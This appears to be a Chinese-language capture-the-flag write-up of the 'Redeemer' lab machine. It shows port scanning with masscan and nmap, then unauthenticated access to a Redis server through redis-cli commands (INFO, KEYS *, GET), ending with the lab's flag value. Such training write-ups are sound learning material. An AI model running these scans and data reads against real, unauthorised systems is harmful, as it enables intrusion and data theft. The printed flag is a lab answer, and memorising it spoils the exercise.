---
title: "Redeemer"
published: 2026-06-14
updated: 2026-06-14
draft: false
description: "nmap太慢了直接masscan做快扫"
image: ""
tags:
  - 渗透测试
category: 网络安全
pinned: false
comment: true
author: Ziddzide
---

> Redeemer is a very easy Linux machine which explores the enumeration and exploitation of a Redis database server while showcasing the redis-cli command line utility and basic commands to interact with the Redis service.

# 机器上哪个 TCP 端口是开放的？

nmap太慢了直接`masscan`做快扫

```bash
masscan 10.129.85.160 -p1-65535 --rate 1000
```

得到

```
Discovered open port 6379/tcp on 10.129.85.160
```

# 机器上打开的端口正在运行哪个服务？

那现在使用nmap探测端口服务就行

```
nmap -sV -p 6379 10.129.85.160
```

得到

```
PORT     STATE SERVICE VERSION
6379/tcp open  redis   Redis key-value store 5.0.7
```

# Redis 是什么类型的数据库？请从以下选项中选择：（i）内存数据库，（ii）传统数据库

内存数据库

# 哪个命令行工具用于与 Redis 服务器交互？请输入您在终端中输入的程序名称（不带任何参数）。

redis-cli

# 在 Redis 命令行工具中，使用哪个标志来指定主机名？

-h

所以我们直接连接上去

```
┌──(root㉿shadow)-[/home/luxin]
└─# redis-cli -h 10.129.85.160
10.129.85.160:6379>
```
# 连接到 Redis 服务器后，使用哪个命令可以获取有关 Redis 服务器的信息和统计信息？

```
10.129.85.160:6379> INFO
```

# 目标机器上使用的 Redis 服务器版本是什么？

```
┌──(root㉿shadow)-[/home/luxin]
└─# redis-cli -h 10.129.85.160
10.129.85.160:6379> INFO
# Server
redis_version:5.0.7
redis_git_sha1:00000000
redis_git_dirty:0
redis_build_id:66bd629f924ac924
redis_mode:standalone
os:Linux 5.4.0-77-generic x86_64
```

5.0.7

# 在 Redis 中，使用哪个命令来选择所需的数据库？

```
# Keyspace
db0:keys=4,expires=0,avg_ttl=0
```

所以

```
SELECT 0
```

# 数据库中索引为 0 的键有多少个？

```
10.129.85.160:6379> DBSIZE
(integer) 4
```

或者

```
# Keyspace
db0:keys=4,expires=0,avg_ttl=0
```

在这里也可以看出来

# 哪个命令可以用来获取数据库中的所有键？

```
10.129.85.160:6379> KEYS *
1) "flag"
2) "temp"
3) "stor"
4) "numb"
10.129.85.160:6379>
```

# 提交数据库中找到的flag。

```
10.129.85.160:6379> GET flag
"03e1d2b376c37ab3f5319922053953eb"
10.129.85.160:6379>
```
03e1d2b376c37ab3f5319922053953eb就是答案
